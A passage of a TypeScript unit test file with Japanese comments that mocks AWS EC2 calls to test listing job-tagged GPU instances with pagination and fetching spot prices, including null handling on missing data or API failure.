              LaunchTime: launchTime,
              InstanceType: "g6f.xlarge",
              Tags: [
                { Key: "Name", Value: "sattori-recorder" },
                { Key: "sattori:jobId", Value: "job-1" },
              ],
            },
            // タグが無い/空のインスタンスはジョブに紐づけられないので捨てる
            // （このサービス以外が同じフィルタに引っかかることは無いはずだが、
            // 判定できないものをterminate候補にしないため）。
            { InstanceId: "i-notag", Tags: [{ Key: "Name", Value: "other" }] },
          ],
        },
        {
          Instances: [
            { InstanceId: "i-bbb", Tags: [{ Key: "sattori:jobId", Value: "job-2" }] },
          ],
        },
      ],
    });

    await expect(listTaggedInstances()).resolves.toEqual([
      { instanceId: "i-aaa", region: "eu-south-2", jobId: "job-1", launchTime, instanceType: "g6f.xlarge" },
      // LaunchTime・InstanceTypeが返らなかった場合はnull
      // （判定側が「たった今起動した」扱いにする。GPUリコンサイラも同様に扱う）。
      { instanceId: "i-bbb", region: "eu-south-2", jobId: "job-2", launchTime: null, instanceType: null },
    ]);
    expect(ec2Mock.commandCalls(DescribeInstancesCommand)[0]?.args[0].input.Filters).toEqual([
      { Name: "tag-key", Values: ["sattori:jobId"] },
      { Name: "instance-state-name", Values: ["pending", "running", "stopping", "stopped"] },
    ]);
  });

  it("NextTokenが返る限りページングして全件集める", async () => {
    ec2Mock
      .on(DescribeInstancesCommand)
      .resolvesOnce({
        Reservations: [
          { Instances: [{ InstanceId: "i-aaa", Tags: [{ Key: "sattori:jobId", Value: "job-1" }] }] },
        ],
        NextToken: "token-1",
      })
      .resolvesOnce({
        Reservations: [
          { Instances: [{ InstanceId: "i-bbb", Tags: [{ Key: "sattori:jobId", Value: "job-2" }] }] },
        ],
      });

    const instances = await listTaggedInstances();
    expect(instances.map((instance) => instance.instanceId)).toEqual(["i-aaa", "i-bbb"]);
    expect(ec2Mock.commandCalls(DescribeInstancesCommand)[1]?.args[0].input.NextToken).toBe(
      "token-1",
    );
  });
});

describe("fetchSpotPrice", () => {
  beforeEach(() => {
    ec2Mock.reset();
  });

  it("直近1件のSpot価格履歴を数値で返す", async () => {
    ec2Mock.on(DescribeSpotPriceHistoryCommand).resolves({
      SpotPriceHistory: [{ SpotPrice: "0.058300" }],
    });

    await expect(fetchSpotPrice("c7i.xlarge", "us-east-1a")).resolves.toBe(0.0583);
    expect(ec2Mock.commandCalls(DescribeSpotPriceHistoryCommand)[0]?.args[0].input).toMatchObject({
      InstanceTypes: ["c7i.xlarge"],
      AvailabilityZone: "us-east-1a",
      ProductDescriptions: ["Linux/UNIX"],
      MaxResults: 1,
    });
  });

  it("インスタンスタイプ・AZが不明ならAPIを呼ばずにnull", async () => {
    await expect(fetchSpotPrice(null, "us-east-1a")).resolves.toBeNull();
    await expect(fetchSpotPrice("c7i.xlarge", null)).resolves.toBeNull();
    expect(ec2Mock.commandCalls(DescribeSpotPriceHistoryCommand)).toHaveLength(0);
  });

  it("履歴が空・数値でない場合はnull", async () => {
    ec2Mock.on(DescribeSpotPriceHistoryCommand).resolves({ SpotPriceHistory: [] });
    await expect(fetchSpotPrice("c7i.xlarge", "us-east-1a")).resolves.toBeNull();

    ec2Mock.on(DescribeSpotPriceHistoryCommand).resolves({
      SpotPriceHistory: [{ SpotPrice: "N/A" }],
    });
    await expect(fetchSpotPrice("c7i.xlarge", "us-east-1a")).resolves.toBeNull();
  });

  it("APIが失敗しても例外を投げずnullを返す（録画そのものを落とさないため）", async () => {
    ec2Mock.on(DescribeSpotPriceHistoryCommand).rejects(new Error("throttled"));
    await expect(fetchSpotPrice("c7i.xlarge", "us-east-1a")).resolves.toBeNull();
  });
});
